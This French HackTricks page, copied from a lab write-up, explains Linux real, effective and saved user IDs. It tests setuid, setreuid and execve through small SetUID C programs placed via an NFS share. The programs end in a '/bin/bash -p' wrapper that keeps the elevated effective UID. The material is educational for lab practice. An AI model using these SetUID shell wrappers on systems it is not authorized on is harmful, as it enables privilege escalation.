# euid, ruid, suid

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Ce post a été copié depuis** [**https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail**](https://0xdf.gitlab.io/2022/05/31/setuid-rabbithole.html#testing-on-jail)

## **`*uid`**

* **`ruid`**: Il s'agit de l'**ID utilisateur réel** de l'utilisateur qui a démarré le processus.
* **`euid`**: Il s'agit de l'**ID utilisateur effectif**, c'est ce que le système regarde pour décider **quels privilèges le processus doit avoir**. Dans la plupart des cas, l'`euid` sera identique au `ruid`, mais un binaire SetUID est un exemple d'un cas où ils diffèrent. Lorsqu'un binaire **SetUID** démarre, l'**`euid` est défini sur le propriétaire du fichier**, ce qui permet à ces binaires de fonctionner.
* `suid`: Il s'agit de l'**ID utilisateur enregistré**, il est utilisé lorsqu'un processus privilégié (dans la plupart des cas en cours d'exécution en tant que root) doit **abaisser les privilèges** pour effectuer un comportement, mais doit ensuite **revenir** à l'état privilégié.

{% hint style="info" %}
Si un **processus non root** veut **changer son `euid`**, il ne peut le **définir** qu'aux valeurs actuelles de **`ruid`**, **`euid`** ou **`suid`**.
{% endhint %}

## set\*uid

À première vue, il est facile de penser que les appels système **`setuid`** définiraient le `ruid`. En fait, pour un processus privilégié, c'est le cas. Mais dans le cas général, il **définit en fait l'`euid`**. Selon la [page de manuel](https://man7.org/linux/man-pages/man2/setuid.2.html):

> setuid() **définit l'ID utilisateur effectif du processus appelant**. Si le processus appelant est privilégié (plus précisément : si le processus a la capacité CAP\_SETUID dans son espace de noms utilisateur), l'UID réel et l'ID utilisateur enregistré sont également définis.

Ainsi, dans le cas où vous exécutez `setuid(0)` en tant que root, cela définit tous les identifiants sur root et les verrouille essentiellement (car `suid` est 0, il perd la connaissance ou tout utilisateur précédent - bien sûr, les processus root peuvent changer pour n'importe quel utilisateur qu'ils veulent).

Deux appels système moins courants, **`setreuid`** (`re` pour réel et effectif) et **`setresuid`** (`res` inclut enregistré) définissent les identifiants spécifiques. Être dans un processus non privilégié limite ces appels (de la [page de manuel](https://man7.org/linux/man-pages/man2/setresuid.2.html) pour `setresuid`, bien que la [page](https://man7.org/linux/man-pages/man2/setreuid.2.html) pour `setreuid` ait un langage similaire) :

> Un processus non privilégié peut changer son **UID réel, son UID effectif et son ID utilisateur enregistré**, chacun pour l'un des suivants : l'UID réel actuel, l'UID effectif actuel ou l'ID utilisateur enregistré actuel.
>
> Un processus privilégié (sous Linux, celui ayant la capacité CAP\_SETUID) peut définir son UID réel, son UID effectif et son ID utilisateur enregistré sur des valeurs arbitraires.

Il est important de se rappeler que ceux-ci ne sont pas là en tant que fonctionnalité de sécurité, mais reflètent plutôt le flux de travail prévu. Lorsqu'un programme veut changer d'utilisateur, il change l'ID utilisateur effectif pour pouvoir agir en tant qu'utilisateur.

En tant qu'attaquant, il est facile de prendre de mauvaises habitudes en appelant simplement `setuid` car le cas le plus courant est de passer à root, et dans ce cas, `setuid` est effectivement identique à `setresuid`.

## Exécution

### **execve (et autres execs)**

L'appel système `execve` exécute un programme spécifié dans le premier argument. Les deuxième et troisième arguments sont des tableaux, les arguments (`argv`) et l'environnement (`envp`). Il existe plusieurs autres appels système qui sont
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    system("id");
    return 0;
}
```
Ce programme est compilé et configuré en tant que SetUID sur Jail via NFS:
```bash
oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;
...[snip]...
oxdf@hacky$ chmod 4755 /mnt/nfsshare/a
```
En tant que root, je peux voir ce fichier:
```
[root@localhost nfsshare]# ls -l a 
-rwsr-xr-x. 1 frank frank 16736 May 30 04:58 a
```
Lorsque j'exécute ceci en tant que nobody, `id` s'exécute en tant que nobody:
```bash
bash-4.2$ $ ./a
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
Le programme démarre avec un `ruid` de 99 (personne) et un `euid` de 1000 (frank). Lorsqu'il atteint l'appel `setuid`, ces mêmes valeurs sont définies.

Ensuite, `system` est appelé et je m'attendrais à voir un `uid` de 99, mais aussi un `euid` de 1000. Pourquoi n'y en a-t-il pas un ? Le problème est que **`sh` est un lien symbolique vers `bash`** dans cette distribution :
```
$ ls -l /bin/sh
lrwxrwxrwx. 1 root root 4 Jun 25  2017 /bin/sh -> bash
```
Ainsi, l'appel système `system` appelle `/bin/sh sh -c id`, qui est effectivement `/bin/bash bash -c id`. Lorsque `bash` est appelé sans `-p`, il voit `ruid` de 99 et `euid` de 1000, et définit `euid` à 99.

### setreuid / system <a href="#setreuid--system" id="setreuid--system"></a>

Pour tester cette théorie, je vais essayer de remplacer `setuid` par `setreuid`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setreuid(1000, 1000);
    system("id");
    return 0;
}
```
Compilation et permissions :
```
oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b
```
Maintenant en prison, maintenant `id` renvoie l'uid de 1000:
```
bash-4.2$ $ ./b
uid=1000(frank) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
L'appel `setreuid` définit à la fois `ruid` et `euid` à 1000, donc lorsque `system` appelle `bash`, ils correspondent et les choses continuent comme frank.

### setuid / execve <a href="#setuid--execve" id="setuid--execve"></a>

En appelant `execve`, si ma compréhension ci-dessus est correcte, je pourrais également ne pas me soucier de manipuler les uids et plutôt appeler `execve`, car cela conservera les identifiants existants. Cela fonctionnera, mais il y a des pièges. Par exemple, le code commun pourrait ressembler à ceci:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/usr/bin/id", NULL, NULL);
    return 0;
}
```
Sans l'environnement (je passe NULL pour simplifier), j'aurai besoin d'un chemin complet sur `id`. Cela fonctionne, renvoyant ce à quoi je m'attends:
```
bash-4.2$ $ ./c
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
Le `[r]uid` est 99, mais le `euid` est 1000.

Si j'essaie d'obtenir un shell à partir de cela, je dois être prudent. Par exemple, en appelant simplement `bash`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(1000);
    execve("/bin/bash", NULL, NULL);
    return 0;
}
```
Je vais compiler cela et le définir en SetUID:
```
oxdf@hacky$ gcc d.c -o /mnt/nfsshare/d
oxdf@hacky$ chmod 4755 /mnt/nfsshare/d
```
Pourtant, cela renverra tout de même tous les nobody:
```
bash-4.2$ $ ./d
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
Si cela avait été `setuid(0)`, cela fonctionnerait bien (en supposant que le processus avait la permission de le faire), car cela changerait les trois identifiants en 0. Mais en tant qu'utilisateur non root, cela ne fait que définir l'`euid` sur 1000 (ce qu'il était déjà), puis appelle `sh`. Mais `sh` est `bash` sur Jail. Et lorsque `bash` démarre avec un `ruid` de 99 et un `euid` de 1000, il ramènera l'`euid` à 99.

Pour résoudre ce problème, j'appellerai `bash -p`:
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    setuid(1000);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```
Cette fois, l'`euid` est présent:
```
bash-4.2$ $ ./e
bash-4.2$ $ id
uid=99(nobody) gid=99(nobody) euid=1000(frank) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```
Ou je pourrais appeler `setreuid` ou `setresuid` au lieu de `setuid`.
